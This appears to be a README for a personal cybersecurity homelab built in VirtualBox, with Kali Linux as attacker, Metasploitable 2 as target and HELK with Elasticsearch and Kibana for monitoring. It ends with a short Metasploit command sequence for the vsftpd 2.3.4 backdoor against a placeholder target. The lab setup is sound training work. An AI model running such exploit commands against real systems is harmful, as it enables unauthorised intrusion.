# 🏠 Cybersecurity Homelab Project

This is a self-hosted cybersecurity homelab built to simulate offensive and defensive scenarios in a safe, isolated environment using VirtualBox and open-source tools. It demonstrates practical skills in system administration, red/blue teaming, network traffic monitoring, and log analysis.

---

## 🔧 Project Evolution

Originally, the lab started with **Security Onion** and a separate **Analyst VM** for packet analysis and dashboards. However, to gain more flexibility and transparency, I switched to **HELK**, which integrates seamlessly with **Elasticsearch** and **Kibana** to provide a modular SIEM platform for threat detection and analysis.

---

## 💻 Current Lab Setup

### Host Machine
- Device: 2019 MacBook Pro  
- OS: macOS Sequoia 15.5  
- Specs: 2.4 GHz Quad-Core Intel Core i5, 8 GB RAM, 250 GB SSD  
- Virtualization: VirtualBox (latest version)  

### Virtual Machines
- Kali Linux (attacker) — Metasploit, Nmap, Netcat  
- Metasploitable 2 (vulnerable target) — For exploitation practice  
- HELK Server with Elasticsearch and Kibana — For detection and monitoring 

### Network Topology
- Adapter 1 (Host-only): Internal VM communication  
- Adapter 2 (NAT): Internet access for Kali and HELK updates  
- All traffic between attacker and target monitored by Wazuh  

---

## ⚙️ Tools & Technologies

### Offensive
- Metasploit Framework  
- Nmap (host discovery and vulnerability scanning)  
- Netcat (reverse shell testing)  

### Defensive
- HELK (SIEM agent and manager)  
- Filebeat (log shipping to Elasticsearch)  
- Elasticsearch + Kibana (search and visualization)  
- Custom Bash scripts (connection monitoring)  

---

## 🔍 Sample Attack Workflow

### Exploit: vsftpd 2.3.4 Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
run
